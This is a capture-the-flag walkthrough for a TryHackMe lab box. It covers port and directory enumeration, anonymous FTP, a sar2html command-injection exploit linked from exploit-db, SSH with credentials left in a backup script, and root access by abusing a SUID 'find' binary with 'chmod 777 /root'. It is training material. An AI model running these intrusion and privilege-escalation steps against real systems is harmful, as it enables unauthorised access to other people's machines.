# Boiler Writeup

##### Room link: https://tryhackme.com/room/empline

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/4a800c6513239dbdfaf74ce869a88add.jpeg">
</p>

## Tasks:

### Question 1

Intermediate level CTF. Just enumerate, you'll get there.

1. File extension after anon login?

2. What is on the highest port?
  
3. What's running on port 10000?
  
4. Can you exploit the service running on that port? (yay/nay answer)

5. What's CMS can you access?
 
6. Keep enumerating, you'll know when you find it.
 
7. The interesting file name in the folder?

### Question 2

1. You can complete this with manual enumeration, but do it as you wish

2. Where was the other users pass stored(no extension, just the name)?

3. user.txt

4. What did you exploit to get the privileged user?

5. root.txt


## 1. Enumeration

Start by enumerating the open ports using nmap, we'll enumerate all ports because we know there ae high ports based on the questions.

<p align="center">
  <img src="https://imgur.com/swRrUwn.png">
</p>


We have 4 open ports, 21,80,10000 and 55007

Lets try anonymous login on port 21:
> 
> ftp 10.10.30.20
> 
> Connected to 10.10.30.20.
> 
> 220 (vsFTPd 3.0.3)
> 
> Name (10.10.30.20:kali): anonymous
> 
> 230 Login successful.
> 
> Remote system type is UNIX.
> 
> Using binary mode to transfer files.

And question 1 hints to secret files, so lets list all files:

> ftp> ls -la
> 
> 229 Entering Extended Passive Mode (|||45173|)
> 
> 150 Here comes the directory listing.
> 
> drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
> 
> drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
> 
> -rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.[REDACTED]
> 
> 226 Directory send OK.
> 
> ftp> 

I downloaded the .info file, and it had some ROT13 text, which when decrypted came out to be "Just wanted to see if you find it. Lol. Remember: Enumeration is the key!".

#### Question 2:

We know that the highest port is 55007, so lets use nmap to get some more information:

<p align="center">
  <img src="https://imgur.com/SzzsmED.png ">
</p>


#### Question 3:


<p align="center">
  <img src="https://imgur.com/drzodzp.png">
</p>


Navigating to $IP:10000 leads us to a webpage that says it is running on an internal server, so it's probably not exploitable.

#### Question 5:

Since port 80 is open, let's try enumerate subdirectories using ffuf:

> ┌──(root㉿kali)-[/home/…/Desktop/THM/practice/linpeas]
> └─# ffuf -u http://10.10.30.20/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                        
> 
>         /'___\  /'___\           /'___\       
>        /\ \__/ /\ \__/  __  __  /\ \__/       
>        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
>         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
>          \ \_\   \ \_\  \ \____/  \ \_\       
>           \/_/    \/_/   \/___/    \/_/       
> 
>        v2.0.0-dev
> ________________________________________________
> 
>  :: Method           : GET
>  :: URL              : http://10.10.30.20/FUZZ
>  :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
>  :: Follow redirects : false
>  :: Calibration      : false
>  :: Timeout          : 10
>  :: Threads          : 40
>  :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
> ________________________________________________
> 
> [Status: 200, Size: 257, Words: 46, Lines: 16, Duration: 195ms]
>     * FUZZ: robots.txt
> 
> [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 187ms]
>     * FUZZ: manual
> 
> [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 615ms]
>     * FUZZ: joomla
> 
> [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 421ms]
>     * FUZZ: 
> 
> [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 181ms]
>     * FUZZ: server-status
> 

FFUF found some interesting directories, let's have a look at robots.txt:


<p align="center">
  <img src=https://imgur.com/o9IymnN.png">
</p>


After trying all the directories, it turns out to be one big red herring. But there is the ASCII cyber on the bottom. 

I decoded it, which gave me base64, after decoding the base64, I got an MD5 hash, and decoded that with crackstation, only for it to say "kidding". Really? Another red herring!

FFUF also found a "joomla" directory, after googling Joomla, I found that it was a CMS. 


<p align="center">
  <img src="https://imgur.com/NqD7H1d.png">
</p>


Let's use FFUF again to enumerate the /joomla directory. 

> ┌──(root㉿kali)-[/home/…/Desktop/THM/practice/linpeas]
> └─# ffuf -u http://10.10.30.20/joomla/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
> 
>         /'___\  /'___\           /'___\       
>        /\ \__/ /\ \__/  __  __  /\ \__/       
>        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
>         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
>          \ \_\   \ \_\  \ \____/  \ \_\       
>           \/_/    \/_/   \/___/    \/_/       
> 
>        v2.0.0-dev
> ________________________________________________
> 
>  :: Method           : GET
>  :: URL              : http://10.10.30.20/joomla/FUZZ
>  :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
>  :: Follow redirects : false
>  :: Calibration      : false
>  :: Timeout          : 10
>  :: Threads          : 40
>  :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
> ________________________________________________
> 
> [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 192ms]
>     * FUZZ: images
> 
> [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 187ms]
>     * FUZZ: media
> 
> [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 187ms]
>     * FUZZ: templates
> 
> [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 185ms]
>     * FUZZ: _test
> 
> [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 190ms]
>     * FUZZ: modules
> 
> [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 254ms]
>     * FUZZ: tests
> 
> [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 186ms]
>     * FUZZ: plugins
> 
> [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 784ms]
>     * FUZZ: bin
> 
> [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 187ms]
>     * FUZZ: includes
> 
> [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 186ms]
>     * FUZZ: language
> 
> [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 186ms]
>     * FUZZ: components
> 
> [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 186ms]
>     * FUZZ: cache
> 
> [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 580ms]
>     * FUZZ: libraries
> 
> [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 183ms]
>     * FUZZ: installation
> 
> [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 182ms]
>     * FUZZ: build
> 
> [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 189ms]
>     * FUZZ: tmp
> 
> [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 191ms]
>     * FUZZ: layouts
> 
> [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 182ms]
>     * FUZZ: administrator
> 
> [WARN] Caught keyboard interrupt (Ctrl-C)



FFUF found lot's of directories, and after taking a look at all of them, _test seemed like our best bet.

The page mentions "sar2html", let's go google that. And we're in luck, exploit db has an exploit: https://www.exploit-db.com/exploits/47204

Let's try use it with a simple ls command!


<p align="center">
  <img src="https://imgur.com/C96SRQ6.png">
</p>


And there's our interesting file!

If we do the same thing, but cat the file, we can see some ssh user credentials.

### Gaining access:

Using the credentials we found in the file, lets ssh onto the box, remembering that the ssh port is 55007.


> ┌──(root㉿kali)-[]
> 
> └─# ssh basterd@10.10.30.20 -p 55007
> 
> basterd@10.10.30.20's password: 
> 
> Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
> 
>  * Documentation:  https://help.ubuntu.com
>  * 
>  * Management:     https://landscape.canonical.com
>  * 
>  * Support:        https://ubuntu.com/advantage
> 
> 8 packages can be updated.
> 
> 8 updates are security updates.
> 
> 
> Last login: Wed May 10 12:19:39 2023 from 10.18.42.194
> 
> $ 
> 



If we run ls, we can see a file, lets take a look at it.


> $ ls
> 
> backup.sh
> 
> $ cat backup.sh
> 
> REMOTE=1.2.3.4
> 
> SOURCE=/home/stoner
> 
> TARGET=/usr/local/backup
> 
> LOG=/home/stoner/bck.log
>  
> DATE=`date +%y\.%m\.%d\.`
> 
> USER=[REDACTED]
> 
> #[REDACTED]
> 
> ...



That looks like credentials for another user!

### Privilege esclataion to stoner

Since we now have the user's name and password, lets change switch to them.


> $ su stoner
> 
> Password: 
> 
> stoner@Vulnerable:/home/basterd$ 


The user flag can be found in stoner's home directory, as a hidden file.


### Privilege escalation to root

Let's do sudo -l:


> 
> stoner@Vulnerable:~$ sudo -l
> 
> User stoner may run the following commands on Vulnerable:
> 
>     (root) NOPASSWD: /NotThisTime/MessinWithYa
>     
> stoner@Vulnerable:~$ 



Looks like another troll! 


Lets try find files that we can run with our SUID bit:


> stoner@Vulnerable:~$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
> 
> -rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
> 
> -rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
> 
> -rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
> 
> -rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
> 
> -rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
> 
> -rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
> 
> -rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
> 
> -rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
> 
> -rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
> 
> -rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
> 
> -rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
> 
> -rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
> 
> -rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
> 
> -r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
> 
> -rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
> 
> -rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
> 
> -rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
> 
> -rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
> 
> -rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
> 
> -rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
> 
> -rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
> 
> -rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
> 
> -rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
> 
> stoner@Vulnerable:~$ 



/usr/bin/find looks interesting! Let's research that: https://gtfobins.github.io/gtfobins/find/#suid


Looks like we can change permissions of a file? So we should try change permissions of the root directory!



> stoner@Vulnerable:~$  find . -exec chmod 777 /root \;
> 
> stoner@Vulnerable:~$ ls -la /root
> 
> total 12
> 
> drwxrwxrwx  2 root root 4096 Aug 22  2019 .
> 
> drwxr-xr-x 22 root root 4096 Aug 22  2019 ..
> 
> -rw-r--r--  1 root root   29 Aug 21  2019 root.txt
> 
> stoner@Vulnerable:~$ 



And now we can read the root.txt file!

## END



